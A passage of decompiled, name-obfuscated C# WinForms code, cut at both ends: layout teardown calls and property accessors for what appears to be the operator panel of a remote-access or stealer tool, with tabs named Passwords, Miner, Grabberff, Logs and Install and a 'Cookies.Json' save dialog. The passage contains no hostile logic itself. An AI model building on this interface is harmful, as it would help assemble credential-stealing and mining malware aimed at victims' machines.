		Control.RenderStyle.SelectionBackColor = Color.FromArgb(100, 88, 255);
		Control.RenderStyle.SelectionForeColor = Color.White;
		Control.RenderStyle.SeparatorColor = Color.Gainsboro;
		Control.RenderStyle.TextRenderingHint = TextRenderingHint.SystemDefault;
		Control.Size = new Size(149, 26);
		MyComputerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1] { ManagerToolStripMenuItem1 });
		MyComputerToolStripMenuItem.ForeColor = Color.FromArgb(0, 126, 249);
		MyComputerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("MyComputerToolStripMenuItem.Image");
		MyComputerToolStripMenuItem.Name = "MyComputerToolStripMenuItem";
		MyComputerToolStripMenuItem.Size = new Size(148, 22);
		MyComputerToolStripMenuItem.Text = "My Computer";
		ManagerToolStripMenuItem1.Name = "ManagerToolStripMenuItem1";
		ManagerToolStripMenuItem1.Size = new Size(121, 22);
		ManagerToolStripMenuItem1.Text = "Manager";
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(1034, 6);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 134;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		vmethod_70().Enabled = true;
		vmethod_70().Interval = 1000;
		vmethod_79().ImageStream = (ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream");
		vmethod_79().TransparentColor = Color.Transparent;
		vmethod_79().Images.SetKeyName(0, "cc.png");
		vmethod_79().Images.SetKeyName(1, "d.png");
		vmethod_81().Enabled = true;
		vmethod_81().Interval = 1000;
		Guna2DragControl1.ContainerControl = this;
		Guna2DragControl1.DockForm = true;
		Guna2DragControl1.DockIndicatorColor = SystemColors.Window;
		Guna2DragControl1.TargetControl = Guna2GradientPanel7;
		vmethod_89().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_VER_NEGATIVE;
		vmethod_89().TargetForm = this;
		vmethod_129().FileName = "Cookies.Json";
		vmethod_129().Filter = "Text|.txt";
		Box1.Location = new Point(1116, 36);
		Box1.Name = "Box1";
		Box1.Size = new Size(22, 12);
		Box1.TabIndex = 135;
		Box1.Text = "";
		Box1.Visible = false;
		Box2.Location = new Point(1136, 44);
		Box2.Name = "Box2";
		Box2.Size = new Size(10, 15);
		Box2.TabIndex = 165;
		Box2.Text = "";
		Box2.Visible = false;
		vmethod_133().Enabled = true;
		vmethod_135().Enabled = true;
		RichTextBox1.Location = new Point(1112, 49);
		RichTextBox1.Name = "RichTextBox1";
		RichTextBox1.Size = new Size(10, 10);
		RichTextBox1.TabIndex = 166;
		RichTextBox1.Text = "";
		RichTextBox1.Visible = false;
		RichTextBox2.Location = new Point(1128, 54);
		RichTextBox2.Name = "RichTextBox2";
		RichTextBox2.Size = new Size(10, 10);
		RichTextBox2.TabIndex = 167;
		RichTextBox2.Text = "";
		RichTextBox2.Visible = false;
		vmethod_6().TargetControl = L1;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		BackgroundImageLayout = ImageLayout.Zoom;
		base.ClientSize = new Size(1106, 548);
		base.Controls.Add(RichTextBox2);
		base.Controls.Add(RichTextBox1);
		base.Controls.Add(Box2);
		base.Controls.Add(Box1);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(panel1);
		base.Controls.Add(Panel7);
		base.Controls.Add(TabControl1);
		base.Controls.Add(Guna2ControlBox1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		base.Name = "Form1";
		ContextMenuStrip1.ResumeLayout(performLayout: false);
		ContextMenuStrip2.ResumeLayout(performLayout: false);
		P1.ResumeLayout(performLayout: false);
		Panel6.ResumeLayout(performLayout: false);
		((ISupportInitialize)Pp1).EndInit();
		panel9.ResumeLayout(performLayout: false);
		panel9.PerformLayout();
		panel8.ResumeLayout(performLayout: false);
		panel8.PerformLayout();
		((ISupportInitialize)PictureBox20).EndInit();
		((ISupportInitialize)PictureBox21).EndInit();
		((ISupportInitialize)PictureBox22).EndInit();
		((ISupportInitialize)PictureBox19).EndInit();
		panel4.ResumeLayout(performLayout: false);
		panel4.PerformLayout();
		TabControl1.ResumeLayout(performLayout: false);
		A.ResumeLayout(performLayout: false);
		B.ResumeLayout(performLayout: false);
		Panel19.ResumeLayout(performLayout: false);
		Panel19.PerformLayout();
		((ISupportInitialize)PictureBox11).EndInit();
		Panel18.ResumeLayout(performLayout: false);
		Panel18.PerformLayout();
		((ISupportInitialize)PictureBox10).EndInit();
		Panel17.ResumeLayout(performLayout: false);
		Panel17.PerformLayout();
		((ISupportInitialize)PictureBox9).EndInit();
		Panel16.ResumeLayout(performLayout: false);
		Panel16.PerformLayout();
		((ISupportInitialize)PictureBox7).EndInit();
		((ISupportInitialize)L1).EndInit();
		C.ResumeLayout(performLayout: false);
		Guna2GradientPanel4.ResumeLayout(performLayout: false);
		TabControl2.ResumeLayout(performLayout: false);
		Connect1.ResumeLayout(performLayout: false);
		CCC.ResumeLayout(performLayout: false);
		Guna2GradientPanel5.ResumeLayout(performLayout: false);
		Guna2GradientPanel5.PerformLayout();
		Remove_List_Connection.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox33).EndInit();
		Guna2GradientPanel7.ResumeLayout(performLayout: false);
		Guna2GradientPanel7.PerformLayout();
		((ISupportInitialize)PictureBox23).EndInit();
		((ISupportInitialize)PictureBox30).EndInit();
		((ISupportInitialize)PictureBox32).EndInit();
		((ISupportInitialize)PictureBox34).EndInit();
		((ISupportInitialize)PictureBox15).EndInit();
		((ISupportInitialize)PictureBox35).EndInit();
		((ISupportInitialize)PictureBox37).EndInit();
		Install1.ResumeLayout(performLayout: false);
		Panel13.ResumeLayout(performLayout: false);
		Panel11.ResumeLayout(performLayout: false);
		Panel11.PerformLayout();
		((ISupportInitialize)PictureBox51).EndInit();
		((ISupportInitialize)PictureBox50).EndInit();
		((ISupportInitialize)PictureBox49).EndInit();
		Guna2GradientPanel9.ResumeLayout(performLayout: false);
		Guna2GradientPanel9.PerformLayout();
		((ISupportInitialize)PictureBox60).EndInit();
		((ISupportInitialize)PictureBox48).EndInit();
		((ISupportInitialize)PictureBox44).EndInit();
		((ISupportInitialize)PictureBox59).EndInit();
		((ISupportInitialize)PictureBox47).EndInit();
		((ISupportInitialize)PictureBox45).EndInit();
		((ISupportInitialize)PictureBox46).EndInit();
		((ISupportInitialize)PictureBox57).EndInit();
		((ISupportInitialize)PictureBox58).EndInit();
		Guna2GradientPanel6.ResumeLayout(performLayout: false);
		Guna2GradientPanel6.PerformLayout();
		((ISupportInitialize)PictureBox56).EndInit();
		((ISupportInitialize)PictureBox43).EndInit();
		((ISupportInitialize)PictureBox24).EndInit();
		((ISupportInitialize)PictureBox38).EndInit();
		((ISupportInitialize)PictureBox40).EndInit();
		((ISupportInitialize)PictureBox41).EndInit();
		((ISupportInitialize)PictureBox54).EndInit();
		((ISupportInitialize)PictureBox55).EndInit();
		((ISupportInitialize)PictureBox53).EndInit();
		((ISupportInitialize)PictureBox52).EndInit();
		((ISupportInitialize)PictureBox42).EndInit();
		((ISupportInitialize)PictureBox39).EndInit();
		((ISupportInitialize)PictureBox36).EndInit();
		((ISupportInitialize)PictureBox29).EndInit();
		Security1.ResumeLayout(performLayout: false);
		Panel23.ResumeLayout(performLayout: false);
		Guna2GradientPanel10.ResumeLayout(performLayout: false);
		Guna2GradientPanel10.PerformLayout();
		((ISupportInitialize)PictureBox69).EndInit();
		((ISupportInitialize)PictureBox17).EndInit();
		((ISupportInitialize)PictureBox68).EndInit();
		((ISupportInitialize)PictureBox62).EndInit();
		((ISupportInitialize)PictureBox63).EndInit();
		((ISupportInitialize)PictureBox64).EndInit();
		((ISupportInitialize)PictureBox66).EndInit();
		((ISupportInitialize)PictureBox67).EndInit();
		Tab_Process.ResumeLayout(performLayout: false);
		Tab_Process.PerformLayout();
		Remove_List_Kill.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox61).EndInit();
		TabPage6.ResumeLayout(performLayout: false);
		Panel32.ResumeLayout(performLayout: false);
		Panel36.ResumeLayout(performLayout: false);
		Panel36.PerformLayout();
		((ISupportInitialize)PictureBox73).EndInit();
		((ISupportInitialize)PictureBox72).EndInit();
		((ISupportInitialize)PictureBox74).EndInit();
		((ISupportInitialize)PictureBox75).EndInit();
		((ISupportInitialize)PictureBox65).EndInit();
		Guna2GradientPanel11.ResumeLayout(performLayout: false);
		Guna2GradientPanel11.PerformLayout();
		((ISupportInitialize)PictureBox70).EndInit();
		TabPage8.ResumeLayout(performLayout: false);
		Panel31.ResumeLayout(performLayout: false);
		Guna2GradientPanel8.ResumeLayout(performLayout: false);
		Guna2GradientPanel8.PerformLayout();
		((ISupportInitialize)PictureBox76).EndInit();
		((ISupportInitialize)PictureBox71).EndInit();
		TabPage9.ResumeLayout(performLayout: false);
		Panel34.ResumeLayout(performLayout: false);
		Guna2GradientPanel13.ResumeLayout(performLayout: false);
		Guna2GradientPanel13.PerformLayout();
		((ISupportInitialize)PictureBox_icon).EndInit();
		Guna2GradientPanel12.ResumeLayout(performLayout: false);
		Guna2GradientPanel12.PerformLayout();
		((ISupportInitialize)num4).EndInit();
		((ISupportInitialize)num3).EndInit();
		((ISupportInitialize)num2).EndInit();
		((ISupportInitialize)num1).EndInit();
		TabPage3.ResumeLayout(performLayout: false);
		Panel24.ResumeLayout(performLayout: false);
		Panel30.ResumeLayout(performLayout: false);
		Panel30.PerformLayout();
		((ISupportInitialize)PictureBox79).EndInit();
		((ISupportInitialize)PictureBox26).EndInit();
		Panel29.ResumeLayout(performLayout: false);
		Panel29.PerformLayout();
		((ISupportInitialize)PictureBox77).EndInit();
		Panel28.ResumeLayout(performLayout: false);
		Panel28.PerformLayout();
		((ISupportInitialize)PictureBox31).EndInit();
		((ISupportInitialize)PictureBox78).EndInit();
		Panel39.ResumeLayout(performLayout: false);
		Panel39.PerformLayout();
		Panel38.ResumeLayout(performLayout: false);
		Panel38.PerformLayout();
		((ISupportInitialize)PictureBox83).EndInit();
		((ISupportInitialize)PictureBox84).EndInit();
		((ISupportInitialize)PictureBox85).EndInit();
		((ISupportInitialize)PictureBox82).EndInit();
		((ISupportInitialize)PictureBox81).EndInit();
		((ISupportInitialize)PictureBox80).EndInit();
		Panel37.ResumeLayout(performLayout: false);
		Panel37.PerformLayout();
		((ISupportInitialize)PictureBox28).EndInit();
		Panel35.ResumeLayout(performLayout: false);
		Panel35.PerformLayout();
		((ISupportInitialize)Nu).EndInit();
		D.ResumeLayout(performLayout: false);
		Panel33.ResumeLayout(performLayout: false);
		Panel33.PerformLayout();
		Panel21.ResumeLayout(performLayout: false);
		Panel21.PerformLayout();
		((ISupportInitialize)PictureBox8).EndInit();
		Panel22.ResumeLayout(performLayout: false);
		Panel22.PerformLayout();
		((ISupportInitialize)PictureBox13).EndInit();
		Panel15.ResumeLayout(performLayout: false);
		Panel15.PerformLayout();
		((ISupportInitialize)PictureBox5).EndInit();
		Panel20.ResumeLayout(performLayout: false);
		Panel20.PerformLayout();
		((ISupportInitialize)PictureBox12).EndInit();
		Panel14.ResumeLayout(performLayout: false);
		Panel14.PerformLayout();
		Panel12.ResumeLayout(performLayout: false);
		Panel12.PerformLayout();
		((ISupportInitialize)PictureBox16).EndInit();
		Panel10.ResumeLayout(performLayout: false);
		Panel10.PerformLayout();
		((ISupportInitialize)PictureBox14).EndInit();
		Guna2CircleProgressBar1.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox6).EndInit();
		Passwords.ResumeLayout(performLayout: false);
		Guna2GradientPanel14.ResumeLayout(performLayout: false);
		Panel40.ResumeLayout(performLayout: false);
		Panel40.PerformLayout();
		Panel41.ResumeLayout(performLayout: false);
		Panel41.PerformLayout();
		((ISupportInitialize)PictureBox86).EndInit();
		Panel42.ResumeLayout(performLayout: false);
		Panel42.PerformLayout();
		((ISupportInitialize)PictureBox87).EndInit();
		Guna2CircleProgressBar2.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox88).EndInit();
		vmethod_99().ResumeLayout(performLayout: false);
		Miner.ResumeLayout(performLayout: false);
		Guna2GradientPanel15.ResumeLayout(performLayout: false);
		Panel43.ResumeLayout(performLayout: false);
		Panel43.PerformLayout();
		Panel44.ResumeLayout(performLayout: false);
		Panel44.PerformLayout();
		((ISupportInitialize)PictureBox89).EndInit();
		Panel45.ResumeLayout(performLayout: false);
		Panel45.PerformLayout();
		((ISupportInitialize)PictureBox90).EndInit();
		Guna2CircleProgressBar3.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox91).EndInit();
		Grabberff.ResumeLayout(performLayout: false);
		Guna2GradientPanel16.ResumeLayout(performLayout: false);
		Panel46.ResumeLayout(performLayout: false);
		Panel46.PerformLayout();
		Panel47.ResumeLayout(performLayout: false);
		Panel47.PerformLayout();
		((ISupportInitialize)PictureBox92).EndInit();
		Panel48.ResumeLayout(performLayout: false);
		Panel48.PerformLayout();
		((ISupportInitialize)PictureBox93).EndInit();
		Guna2CircleProgressBar4.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox94).EndInit();
		Logs.ResumeLayout(performLayout: false);
		Guna2GradientPanel17.ResumeLayout(performLayout: false);
		Panel49.ResumeLayout(performLayout: false);
		Panel49.PerformLayout();
		Panel50.ResumeLayout(performLayout: false);
		Panel50.PerformLayout();
		((ISupportInitialize)PictureBox95).EndInit();
		Panel51.ResumeLayout(performLayout: false);
		Panel51.PerformLayout();
		((ISupportInitialize)PictureBox96).EndInit();
		Guna2CircleProgressBar5.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox97).EndInit();
		vmethod_127().ResumeLayout(performLayout: false);
		Settings.ResumeLayout(performLayout: false);
		Panel27.ResumeLayout(performLayout: false);
		Panel27.PerformLayout();
		((ISupportInitialize)PictureBox25).EndInit();
		Panel26.ResumeLayout(performLayout: false);
		Panel26.PerformLayout();
		((ISupportInitialize)PictureBox18).EndInit();
		Panel25.ResumeLayout(performLayout: false);
		Panel25.PerformLayout();
		((ISupportInitialize)PictureBox4).EndInit();
		Panel5.ResumeLayout(performLayout: false);
		Panel5.PerformLayout();
		((ISupportInitialize)PictureBox3).EndInit();
		Panel3.ResumeLayout(performLayout: false);
		Panel3.PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		Abouts.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox98).EndInit();
		panel1.ResumeLayout(performLayout: false);
		panel2.ResumeLayout(performLayout: false);
		panel2.PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		Control.ResumeLayout(performLayout: false);
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ImageList vmethod_0()
	{
		return imageList_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(ImageList WithEventsValue)
	{
		imageList_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual System.Windows.Forms.Timer vmethod_2()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(System.Windows.Forms.Timer WithEventsValue)
	{
		EventHandler value = method_19;
		System.Windows.Forms.Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_4()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2Elipse vmethod_6()
	{
		return guna2Elipse_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_7(Guna2Elipse WithEventsValue)
	{
		guna2Elipse_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2Elipse vmethod_8()
	{
		return guna2Elipse_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_9(Guna2Elipse WithEventsValue)
	{
		guna2Elipse_1 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual System.Windows.Forms.Timer vmethod_10()
	{
		return timer_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_11(System.Windows.Forms.Timer WithEventsValue)
	{
		EventHandler value = method_20;
		System.Windows.Forms.Timer timer = timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_1 = WithEventsValue;
		timer = timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_12()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_13(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual FolderBrowserDialog vmethod_14()
	{
		return folderBrowserDialog_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_15(FolderBrowserDialog WithEventsValue)
	{
		folderBrowserDialog_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ImageList vmethod_16()
	{
		return imageList_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_17(ImageList WithEventsValue)
	{
		imageList_1 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_18()
	{
		return columnHeader_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_19(ColumnHeader WithEventsValue)
	{
		columnHeader_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_20()
	{
		return columnHeader_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_21(ColumnHeader WithEventsValue)
	{
		columnHeader_1 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_22()
	{
		return columnHeader_2;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_23(ColumnHeader WithEventsValue)
	{
		columnHeader_2 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_24()
	{
		return columnHeader_3;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_25(ColumnHeader WithEventsValue)
	{
		columnHeader_3 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_26()
	{
		return columnHeader_4;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_27(ColumnHeader WithEventsValue)
	{
		columnHeader_4 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_28()
	{
		return columnHeader_5;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_29(ColumnHeader WithEventsValue)
	{
		columnHeader_5 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_30()
	{
		return columnHeader_6;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_31(ColumnHeader WithEventsValue)
	{
		columnHeader_6 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_32()
	{
		return columnHeader_7;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_33(ColumnHeader WithEventsValue)
	{
		columnHeader_7 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader sAdrwXngcsy()
	{
		return columnHeader_8;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_34(ColumnHeader WithEventsValue)
	{
		columnHeader_8 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_35()
	{
		return columnHeader_9;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_36(ColumnHeader WithEventsValue)
	{
		columnHeader_9 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_37()
	{
		return columnHeader_10;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_38(ColumnHeader WithEventsValue)
	{
		columnHeader_10 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_39()
	{
		return columnHeader_11;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_40(ColumnHeader WithEventsValue)
	{
		columnHeader_11 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_41()
	{
		return columnHeader_12;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_42(ColumnHeader WithEventsValue)
	{
		columnHeader_12 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_43()
	{
		return columnHeader_13;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_44(ColumnHeader WithEventsValue)
	{
		columnHeader_13 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_45()
	{
		return columnHeader_14;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void yocrwWjOaxM(ColumnHeader WithEventsValue)
	{
		columnHeader_14 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_46()
	{
		return xbiAelilYi;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_47(ColumnHeader WithEventsValue)
	{
		xbiAelilYi = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_48()
	{
		return columnHeader_15;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_49(ColumnHeader WithEventsValue)
	{
		columnHeader_15 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_50()
	{
		return columnHeader_16;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_51(ColumnHeader WithEventsValue)
	{
		columnHeader_16 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_52()
	{
		return columnHeader_17;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_53(ColumnHeader WithEventsValue)
	{
		columnHeader_17 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_54()
	{
		return columnHeader_18;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_55(ColumnHeader WithEventsValue)
	{
		columnHeader_18 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_56()
	{
		return columnHeader_19;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_57(ColumnHeader WithEventsValue)
	{
		columnHeader_19 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_58()
	{
		return columnHeader_20;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_59(ColumnHeader WithEventsValue)
	{
		columnHeader_20 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_60()
	{
		return columnHeader_21;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_61(ColumnHeader WithEventsValue)
	{
		columnHeader_21 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ImageList vmethod_62()
	{
		return imageList_2;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_63(ImageList WithEventsValue)
	{
		imageList_2 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_64()
	{
		return columnHeader_22;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_65(ColumnHeader WithEventsValue)
	{
		columnHeader_22 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_66()
	{
		return columnHeader_23;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_67(ColumnHeader WithEventsValue)
	{
		columnHeader_23 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_68()
	{
		return columnHeader_24;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_69(ColumnHeader WithEventsValue)
	{
		columnHeader_24 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual System.Windows.Forms.Timer vmethod_70()
	{
		return timer_2;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_71(System.Windows.Forms.Timer WithEventsValue)
	{
		EventHandler value = method_72;
		System.Windows.Forms.Timer timer = timer_2;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_2 = WithEventsValue;
		timer = timer_2;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_72()
	{
		return columnHeader_25;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_73(ColumnHeader WithEventsValue)
	{
		columnHeader_25 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader FbfrbuIoBbK()
	{
		return columnHeader_26;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_74(ColumnHeader WithEventsValue)
	{
		columnHeader_26 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_75()
	{
		return columnHeader_27;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_76(ColumnHeader WithEventsValue)
	{
		columnHeader_27 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_77()
	{
		return columnHeader_28;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_78(ColumnHeader WithEventsValue)
	{
		columnHeader_28 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ImageList vmethod_79()
	{
		return imageList_3;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_80(ImageList WithEventsValue)
	{
		imageList_3 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual System.Windows.Forms.Timer vmethod_81()
	{
		return timer_3;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_82(System.Windows.Forms.Timer WithEventsValue)
	{
		EventHandler value = method_73;
		System.Windows.Forms.Timer timer = timer_3;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_3 = WithEventsValue;
		timer = timer_3;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_83()
	{
		return columnHeader_29;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_84(ColumnHeader WithEventsValue)
	{
		columnHeader_29 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_85()
	{
		return columnHeader_30;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_86(ColumnHeader WithEventsValue)
	{
		columnHeader_30 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_87()
	{
		return columnHeader_31;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_88(ColumnHeader WithEventsValue)
	{
		columnHeader_31 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_89()
	{
		return guna2AnimateWindow_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_90(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_1 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_91()
	{
		return columnHeader_32;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_92(ColumnHeader WithEventsValue)
	{
		columnHeader_32 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_93()
	{
		return columnHeader_33;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_94(ColumnHeader WithEventsValue)
	{
		columnHeader_33 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_95()
	{
		return columnHeader_34;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_96(ColumnHeader WithEventsValue)
	{
		columnHeader_34 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_97()
	{
		return columnHeader_35;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_98(ColumnHeader WithEventsValue)
	{
		columnHeader_35 = WithEventsValue;
	}

	[SpecialName]
